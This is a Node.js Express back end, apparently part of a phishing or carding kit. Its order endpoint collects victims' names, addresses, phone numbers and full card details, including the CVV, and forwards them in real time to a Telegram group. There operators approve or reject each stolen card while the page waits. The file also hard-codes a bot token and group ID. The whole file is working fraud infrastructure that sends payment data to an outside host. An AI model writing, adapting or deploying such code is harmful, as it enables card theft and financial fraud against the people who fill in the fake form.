require("dotenv").config();


const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(express.json());
app.use(cors({ origin: "*" }));


const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();

const DEFAULT_PORT = 38471;
const PORT     = parseInt(process.env.PORT || String(DEFAULT_PORT), 10);
const SELF_URL = (process.env.SELF_URL || `http://localhost:${PORT}`).replace(/\/$/, "");

const TIMEOUT_MS = 10 * 60 * 1000;

const pending = new Map();


async function tgPost(method, body) {
  if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
  const res = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    }
  );
  const json = await res.json().catch(() => ({}));
  if (!json.ok) {
    throw new Error(
      `Telegram ${method} failed: ${json.description || res.status}`
    );
  }
  return json;
}

async function sendOrderToTelegram({
  request_id,
  name, address, phone,
  card_number, card_name, card_expiry, card_cvv,
  amount,
}) {
  if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");

  const lines = ["🎟 Новая заявка на покупку"];
  if (name)        lines.push(`👤 Имя: ${name}`);
  if (address)     lines.push(`📍 Адрес: ${address}`);
  if (phone)       lines.push(`📞 Телефон: ${phone}`);
  if (amount)      lines.push(`💰 Сумма: ${amount}`);
  lines.push("");
  lines.push("💳 Данные карты:");
  if (card_number) lines.push(`   Номер: ${card_number}`);
  if (card_name)   lines.push(`   Держатель: ${card_name}`);
  if (card_expiry) lines.push(`   Срок: ${card_expiry}`);
  if (card_cvv)    lines.push(`   CVV: ${card_cvv}`);

  await tgPost("sendMessage", {
    chat_id: GROUP_CHAT_ID,
    text: lines.join("\n"),
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Подтвердить",      callback_data: `${request_id}:ok`    },
        { text: "❌ Не подходит",      callback_data: `${request_id}:nope`  },
        { text: "⚠️ Неверные данные", callback_data: `${request_id}:wrong` },
      ]],
    },
  });
}

function waitForCallback(request_id) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => {
      pending.delete(request_id);
      resolve({ timeout: true });
    }, TIMEOUT_MS);
    pending.set(request_id, { resolve, timer });
  });
}


app.post("/api/order", async (req, res) => {
  const { profile = {}, card = {}, amount = "" } = req.body;
  const request_id = uuidv4();

  const name    = [profile.firstName, profile.lastName].filter(Boolean).join(" ");
  const address = [
    profile.street,
    [profile.postcode, profile.city].filter(Boolean).join(" "),
    profile.country,
  ].filter(Boolean).join(", ");

  try {
    await sendOrderToTelegram({
      request_id,
      name,
      address,
      phone:       profile.phone || "",
      card_number: card.number   || "",
      card_name:   card.name     || "",
      card_expiry: card.month && card.year ? `${card.month}/${card.year}` : "",
      card_cvv:    card.cvv      || "",
      amount,
    });
  } catch (err) {
    console.error("[order] Telegram error:", err.message);
    return res.status(502).json({
      ok: false,
      error: "Telegram unavailable",
      detail: err.message,
    });
  }

  console.log(`[order] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[order] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[order] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});


app.post("/api/callback", (req, res) => {
  const { request_id, action } = req.body || {};
  console.log(`[callback] request_id=${request_id}  action=${action}`);

  const entry = pending.get(request_id);
  if (entry) {
    clearTimeout(entry.timer);
    pending.delete(request_id);
    entry.resolve({ action });
  } else {
    console.warn(`[callback] no pending entry for ${request_id}`);
  }

  res.json({ ok: true });
});

app.get("/health", (_req, res) =>
  res.json({ ok: true, pending: pending.size })
);


app.listen(PORT, "0.0.0.0", () => {
  console.log(`Backend listening on http://0.0.0.0:${PORT}`);
  console.log(`  BOT_TOKEN     = ${BOT_TOKEN     ? "set ✓" : "NOT SET ✗"}`);
  console.log(`  GROUP_CHAT_ID = ${GROUP_CHAT_ID  || "NOT SET ✗"}`);
  console.log(`  SELF_URL      = ${SELF_URL} (info only)`);
  console.log(
    "  Bot must POST to: .../api/callback — set BACKEND_CALLBACK_URL on PythonAnywhere"
  );
  if (!BOT_TOKEN)     console.warn("  ⚠ Set BOT_TOKEN in .env (token of @cardeeee_bot)");
  if (!GROUP_CHAT_ID) console.warn("  ⚠ Set GROUP_CHAT_ID in .env (numeric Telegram group ID)");
});
